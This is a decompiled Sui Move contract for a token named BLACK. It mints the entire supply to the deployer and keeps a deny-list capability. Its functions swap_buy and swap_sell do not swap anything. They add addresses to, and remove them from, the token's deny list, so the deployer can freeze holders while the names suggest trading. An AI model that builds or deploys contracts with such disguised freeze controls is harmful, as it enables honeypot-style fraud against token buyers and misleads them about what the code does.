module 0x70e32e4ebbf2306da1aa63f020247554c0da15895a5b940096fd5f9991cd4e3d::black {
    struct BLACK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BLACK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BLACK>(arg0, 9, b"BLACK", b"justablackhole", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSae5VsK2z7JMFK58aPybrzX8FWGvum7kTwvZCrLyzxDw"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BLACK>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BLACK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BLACK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BLACK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLACK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BLACK>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLACK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BLACK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

